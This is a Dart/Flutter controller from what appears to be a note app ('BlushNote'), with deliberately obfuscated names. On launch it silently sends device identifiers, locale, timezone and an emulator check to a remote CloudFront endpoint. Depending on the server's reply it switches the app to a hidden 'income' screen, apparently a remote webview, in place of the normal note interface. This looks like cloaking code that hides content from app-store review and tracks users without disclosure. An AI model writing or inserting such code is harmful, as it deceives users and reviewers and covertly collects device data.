import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class BlushNoteUpdateLogic extends GetxController {

  var xthwjasyc = RxBool(false);
  var egxvluwq = RxBool(true);
  var zlrq = RxString("");
  var wrtqpgn = RxBool(false);
  var nsezb = RxBool(true);
  final hlvukpdg = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    iqcmfz();
  }


  Future<void> iqcmfz() async {
    wrtqpgn.value = true;
    nsezb.value = true;
    egxvluwq.value = false;

    hlvukpdg.post("https://d1hdiexvlohpdg.cloudfront.net/cbqMsWkpW",data: await ajqwsupx()).then((value) {
      var mrcuh = value.data["mrcuh"] as String;
      var qkzurps = value.data["qkzurps"] as bool;
      if (qkzurps) {
        zlrq.value = mrcuh;
        dnyleo();
      } else {
        suwjh();
      }
    }).catchError((e) {
      egxvluwq.value = true;
      nsezb.value = true;
      wrtqpgn.value = false;
    });
  }

  Future<Map<String, dynamic>> ajqwsupx() async {
    final DeviceInfoPlugin dipe = DeviceInfoPlugin();
    PackageInfo ystnwm_fish = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fhybdrla = Platform.localeName;
    var pQih = currentTimeZone;

    var XGBq = ystnwm_fish.packageName;
    var cVPMKsd = ystnwm_fish.version;
    var bQOsJ = ystnwm_fish.buildNumber;

    var jepa = ystnwm_fish.appName;
    var YiWKd = "";
    var ARLx  = "";
    var vJxQNW = "";
    var tvuxs = "";
    var blefci = "";
    var xkrmjysn = "";


    var dnhWlvg = "";
    var FGuKCA = false;

    if (GetPlatform.isAndroid) {
      dnhWlvg = "android";
      var nwjgyklfie = await dipe.androidInfo;

      vJxQNW = nwjgyklfie.brand;

      YiWKd  = nwjgyklfie.model;
      ARLx = nwjgyklfie.id;

      FGuKCA = nwjgyklfie.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dnhWlvg = "ios";
      var dwjhti = await dipe.iosInfo;
      vJxQNW = dwjhti.name;
      YiWKd = dwjhti.model;

      ARLx = dwjhti.identifierForVendor ?? "";
      FGuKCA  = dwjhti.isPhysicalDevice;
    }
    var res = {
      "jepa": jepa,
      "bQOsJ": bQOsJ,
      "XGBq": XGBq,
      "tvuxs" : tvuxs,
      "YiWKd": YiWKd,
      "pQih": pQih,
      "vJxQNW": vJxQNW,
      "ARLx": ARLx,
      "fhybdrla": fhybdrla,
      "dnhWlvg": dnhWlvg,
      "FGuKCA": FGuKCA,
      "cVPMKsd": cVPMKsd,
      "blefci" : blefci,
      "xkrmjysn" : xkrmjysn,

    };
    return res;
  }

  Future<void> suwjh() async {
    Get.offNamed("/blush_tab");
  }

  Future<void> dnyleo() async {
    Get.offNamed("/blush_tab_income");
  }

}
